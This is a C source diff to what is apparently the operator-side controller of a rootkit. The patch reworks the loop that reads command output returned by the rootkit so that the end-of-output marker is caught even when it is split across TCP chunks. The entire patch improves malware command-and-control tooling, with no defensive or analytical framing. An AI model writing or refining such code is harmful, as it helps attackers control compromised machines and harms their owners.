@@ -267,24 +267,34 @@ int main(int argc, char **argv)
             }
 
             /* 3. Read stream until the specific end of output marker is detected */
-            while (1) {
-                ssize_t n;
+            {
+                char tail[32] = { 0 };
+                char combined[BUF_SIZE + sizeof(tail)];
 
-                memset(buf, 0, sizeof(buf));
-                n = read(client_fd, buf, sizeof(buf) - 1);
-                if (n <= 0) {
-                    printf("\n[!] Connection lost or rootkit disconnected.\n");
-                    connection_lost = 1;
-                    break;
-                }
+                while (1) {
+                    ssize_t n;
 
-                buf[n] = '\0';
-                printf("%s", buf);
-                fflush(stdout);
+                    memset(buf, 0, sizeof(buf));
+                    n = read(client_fd, buf, sizeof(buf) - 1);
+                    if (n <= 0) {
+                        printf("\n[!] Connection lost or rootkit disconnected.\n");
+                        connection_lost = 1;
+                        break;
+                    }
 
-                /* Synchronize loop and break when the transmission block ends */
-                if (strstr(buf, "--- End of Output ---\n\n") != NULL) {
-                    break;
+                    buf[n] = '\0';
+                    printf("%s", buf);
+                    fflush(stdout);
+
+                    /* Check sentinel across chunk boundary to handle TCP fragmentation */
+                    snprintf(combined, sizeof(combined), "%s%s", tail, buf);
+                    if (strstr(combined, "--- End of Output ---\n\n") != NULL)
+                        break;
+
+                    size_t copy_len = (size_t)n < sizeof(tail) - 1
+                                      ? (size_t)n : sizeof(tail) - 1;
+                    memcpy(tail, buf + n - copy_len, copy_len);
+                    tail[copy_len] = '\0';
                 }
             }
 
